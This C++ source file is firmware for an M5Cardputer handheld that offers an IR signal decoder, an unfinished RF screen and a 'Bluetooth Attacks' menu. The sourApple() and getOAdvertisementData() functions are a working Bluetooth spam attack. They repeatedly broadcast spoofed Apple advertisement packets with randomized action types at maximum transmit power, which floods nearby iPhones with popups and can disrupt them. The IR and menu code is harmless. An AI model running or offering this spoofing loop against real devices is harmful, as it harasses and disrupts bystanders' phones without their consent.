/*
 * This file is part of the BadCard project, originally developed by Iván (VoidNoi).
 * This file is also part of the ESP32-Sour-Apple project, originally developed by RapierXbox.
 * 
 * This file is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This file is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this file.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <M5Cardputer.h>
#include <IRremoteESP8266.h> 
#include <IRrecv.h>
#include <SD.h>
#include <SPI.h>
#include <NimBLEDevice.h>

#define display M5Cardputer.Display
#define keyboard M5Cardputer.Keyboard

#define availableOptions 2
#define USECPERTICK 50

String APPversion = "Waves v0.0.1";

int letterHeight = 16.6;
int letterWidth = 12;

int cursorPosX, cursorPosY, screenPosX, screenPosY = 0;

int menuOption = 0;
int bluetoothOption = 0;

//const int bgColor = 0xFC80;

IRrecv irReceiver(1);
decode_results results;

NimBLEAdvertising *pAdvertising;

void RFfn();
void irReceiveDecoded();
void bluetoothAttacks();
void about();

void setup() {
  // put your setup code here, to run once:
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);

  NimBLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); //This should increase transmitting power to 9dBm
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); //Not sure if this works with NimBLE
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);

  NimBLEServer *pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();

  Serial.begin(115200);

  irReceiver.enableIRIn();

  display.setRotation(1);
  display.setTextColor(BLACK);

  bootLogo();

}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
 // M5Cardputer.update();
  
}

void bootLogo(){
  display.fillScreen(ORANGE);

  display.setTextSize(2.2);
  display.setCursor(display.width()/2.05 - (APPversion.length()/2) * letterWidth, display.height()/2 - 17);
  display.println(APPversion);

  display.setTextSize(1.8);
  display.setCursor(display.width()/2 - 80, display.height()/2 + 40);
  display.println("Press any key...");

   while(true) {
    M5Cardputer.update();
    if (keyboard.isChange()) {
      delay(100);
      mainMenu();
      break;
    }
  }
}

void mainMenu(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("Main Menu");
  display.setTextSize(1.7);
  display.setCursor(20, 40);
  display.println("1 - RF");
  display.setCursor(20, 60);
  display.println("2 - IR");
  display.setCursor(20, 80);
  display.println("3 - Bluetooth Attacks");
  display.setCursor(20, 100);
  display.println("4 - About");

  while(true) {
    M5Cardputer.update();
      if (keyboard.isChange() && menuOption == 0) {
        delay(100);
        if(keyboard.isKeyPressed('1')){
          menuOption = 1;
          RFfn();
          break;
        } else if(keyboard.isKeyPressed('2')){
          menuOption = 2;
          irOptions();
          break;
        }else if(keyboard.isKeyPressed('3')){
          menuOption = 3;
          bluetoothAttacks();
          break;
        } else if(keyboard.isKeyPressed('4')){
          menuOption = 4;
          about();
          break;
      }
    }
  }
}

void RFfn(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("RF (WIP)");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      mainMenu();
      break;
    }
  }
}

void about(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 30);
  display.println(APPversion);
  display.setCursor(20, 60);
  display.setTextSize(1.5);
  display.println("Developed by:");
  display.setCursor(20, 80);
  display.println("viniHNS");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      mainMenu();
      break;
    }
  }
}

void irOptions(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("IR Options");
  display.setTextSize(1.7);
  display.setCursor(20, 30);
  display.println("1 - Receive (Decoded)");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      mainMenu();
      break;
    }
    if(keyboard.isKeyPressed('1')){
      irReceiveDecoded();
      break;
    }
  }
}

void bluetoothAttacks(){
  display.setTextSize(2);
  display.fillScreen(ORANGE);
  display.setCursor(20, 5);
  display.println("Bluetooth Attacks");
  display.setTextSize(1.7);
  display.setCursor(20, 30);
  display.println("1 - Sour Apple");
  display.setCursor(20, 50);
  display.println("2 - WIP");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  delay(500);
  while(true) {
    M5Cardputer.update();
    if (keyboard.isKeyPressed('`')) {
      delay(100);
      menuOption = 0;
      bluetoothOption = 0;
      mainMenu();
      break;
    }
    if(keyboard.isKeyPressed('1')){
      bluetoothOption = 1;
      sourApple();
      break;
    }
  }
}

void sourApple(){
  display.setTextSize(1.5);
  display.fillScreen(ORANGE);
  display.setCursor(21, 20);
  display.println("Sour Apple Running...");
  display.setCursor(18, 110);
  display.setTextSize(1.5);
  display.println("Press ESC to return...");
  while(true){
    M5Cardputer.update();  
    if(keyboard.isKeyPressed('`')){
      delay(100);
      menuOption = 0;
      bluetoothOption = 0;
      mainMenu();
      break;
    }
    delay(40);
    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  }
  
}

void irReceiveDecoded() {
  display.setTextSize(1.5);
  display.fillScreen(ORANGE);
  display.setCursor(20, 20);
  display.println("IR Received:");
  while(true){
    M5Cardputer.update();  
    if(keyboard.isKeyPressed('`')){
      delay(100);
      menuOption = 0;
      mainMenu();
    }

    if (irReceiver.decode(&results)) {
      int value = results.value;
      delay(1000);
      display.setTextSize(2);
      display.setCursor(20, 40);
      display.fillRect(20, 40, 200, 30, ORANGE); // Limpa a área onde o valor é exibido
      if (results.decode_type == UNKNOWN) {   // Verificamos o tipo de codificação do sinal de infravermelho usado e mostramos
        display.print("UNK: "); 
      } 
      else if (results.decode_type == NEC) {
        display.print("NEC: ");
      } 
      else if (results.decode_type == SONY) {
        display.print("SONY: ");
      } 
      else if (results.decode_type == RC5) {
        display.print("RC5: ");
      } 
      else if (results.decode_type == RC6) {
        display.print("RC6: ");
      }
      else if (results.decode_type == PANASONIC) { 
        display.print("PANASONIC: ");
      }
      else if (results.decode_type == JVC) {
        display.print("JVC: ");
      }     
      display.println(value, HEX);
      display.setCursor(15, 100);
      display.setTextSize(1.5);
      display.println("Press ESC to return...");
      irReceiver.resume(); // Recebe o próximo valor
      
    }
  }
}

void irSend() {
  display.fillScreen(ORANGE);
  display.setCursor(20, 20);
  display.println("IR Send");
}
